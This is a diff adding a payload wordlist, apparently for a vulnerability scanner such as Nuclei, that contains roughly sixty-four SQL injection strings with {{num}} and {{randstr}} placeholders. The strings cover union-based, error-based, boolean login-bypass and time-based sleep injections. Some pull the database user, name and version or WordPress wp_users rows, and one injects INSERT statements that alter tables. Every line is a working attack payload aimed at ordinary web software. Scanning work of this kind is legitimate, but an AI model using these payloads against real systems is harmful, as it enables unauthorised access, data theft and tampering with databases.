@@ -1,0 +1,68 @@
+-1)union(select(3),null,null,null,null,null,str(98989*44313),null
+@`'`/_!50000Union+_/+/_!50000select+_/+md5({{num}})+--+@`'`
+'+or+2>1+--+
+'
+admin' or 1=1#
+admin'+or+'1'%3D'1'%23
+admin%27+or+%271%27%3D%271
+admin%27+or+%271%27%3D%271%27%23
+admin'+and++updatexml(1,concat(0x1,md5({{num}})),1)+and+'1'='1
+1 and extractvalue(1,concat(0x7e,md5({{num}}))) --+
+1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20md5({{num}})),0x7e),1)--%20
+33'union%20select%20sys.fn_sqlvarbasetostr(HashBytes('MD5','{{randstr}}')),2--
+@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5({{num}})))),@`%27`
+1%20and%20extractvalue(1,concat_ws(1,1,md5({{num}})))
+aa") and extractvalue(1,concat(0x7e,md5({{num}}))) -- a
+aa' or extractvalue(0x0a,concat(0x0a,md5({{num}})))#
+aa%錦%27%20union%20select%201,md5({{num}}),3%23%27
+123456+AND+(SELECT+1+FROM(SELECT+COUNT(*)%2cCONCAT(0x7e%2cmd5({{num}})%2c0x7e%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)--%2b'
+USERNAME' AND EXTRACTVALUE(1337,CONCAT(0x5C,0x5A534C,(SELECT (ELT(1337=1337,1))),0x5A534C)) AND 'joxy'='joxy"
+admin%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{num}}),1,1),NULL,NULL,NULL,NULL--%20-
+1%27+and+extractvalue(0x0a,concat(0x0a,(select+concat_ws(0x207c20,md5({{num}}),1,user()))))--+-
+test'); INSERT INTO extra_field_rel_tag(field_id, tag_id, item_id) VALUES (16, 16, 16); INSERT INTO extra_field_values(field_id, item_id,value) VALUES (16, 16,'{{randstr}}'); INSERT INTO extra_field_options(option_value) VALUES ('{{randstr}}'); INSERT INTO tag (id, tag, field_id,count) VALUES(16, '{{randstr}}', 16,0) ON DUPLICATE KEY UPDATE     tag='{{randstr}}', field_id=16, count=0;  -- 
+test') or 1=1 -- 
+1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5({{num}}),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)
+(SELECT%20md5({{num}}))
+20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual)%20is%20null%20%20OR%20(1%2B1
+1%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2CCONCAT%28%27vbulletin%27%2C%27rce%27%2C%40%40version%29%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27--+-
+%E9%8C%A6%27%20union%20select%201,2,3,4,5,6,7,md5({{num}}),9%23
+antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+--+
+錦%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,2,3,md5({{num}}),5,6,7,8,9%23
+1%27%20or%20sleep(6)%23
+%27%29or%601%60%3D%601%60%3B--+-
+(select*from(select(sleep(6)))a)
+'+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+-
+11�%27%20union%20select%201,2,3,concat(0x3C2F613E20),5,6,7,md5({{num}}),9%20from%20qs_admin#
+(SELECT%20(CASE%20WHEN%20(7422=7422)%20THEN%200x6e616d65%20ELSE%20(SELECT%203211%20UNION%20SELECT%208682)%20END))
+%20UNION%20SELECT%20NULL,NULL,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION(),0x6e75636c65692d74656d706c617465),NULL,NULL,NULL,NULL,NULL--%20aa
+1 and updatexml(1,concat(0x7e,(SELECT md5({{num}})),0x7e),1)
+520)%2f**%2funion%2f**%2fselect%2f\*\*%2f1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2Cunhex%28%2770726f6a656374646973636f766572792e696f%27%29%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%23
+1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2Cmd5({{num}})%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%3B--%20-
+1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a767671,0x685741416c436654694d446d416f717a6b54704a457a5077564653614970664166646654696e724d,0x7171786b71),NULL-- -
+%7B%22refUrl%22:%22'%20union%20select%201,1,md5({{num}}),4--%20%22%7D
+id%3Bselect(md5({{num}}))
+1%20AND%20(SELECT%203875%20FROM%20(SELECT(SLEEP(6)))xoOt)
+1%20AND%20(SELECT%207242%20FROM%20(SELECT(SLEEP(4)))HQYx)
+%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252c%252522sqli-test%252522%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500
+)%20OR%20true--%20-
+%7b%7d&fields=%2a%20from%20wp_users--%20-
+1%20UNION%20ALL%20SELECT%201,(@@version)--%20
+%28SELECT%20CONCAT%28CONCAT%28CHAR%28126%29%2C%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28db_name%28%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%29%2CCHAR%28126%29%29%29
+1%20union%20SELECT%201,2,3,25367\*75643,5,6,7%20limit%205,1%20%23
+(select(0)from(select(sleep(5)))a)
+%27+Or+1--+-
+admin%27+or+%271%27%3D%271%27%23
+0%20union%20select%20sleep(5)%20--%20g
+sleep(6) -- x
+aaa%27+union+select+1,sleep(6),3--+-
+1+AND+(SELECT+6881+FROM+(SELECT(SLEEP(6)))iEAn)
+%27+and+(select%20pg_sleep(10))+ISNULL--
+1'+and+sleep(5)+or+'
+-3%27%20union%20select%201,md5({{num}}),3,4,5,6--+
+0)%20union%20select%20md5({{num}}),null,null%20--%20g
+updatexml(1,version(),1)
+1+AND+(SELECT+8948+FROM+(SELECT(SLEEP(6)))iIic)
+
+
+
+
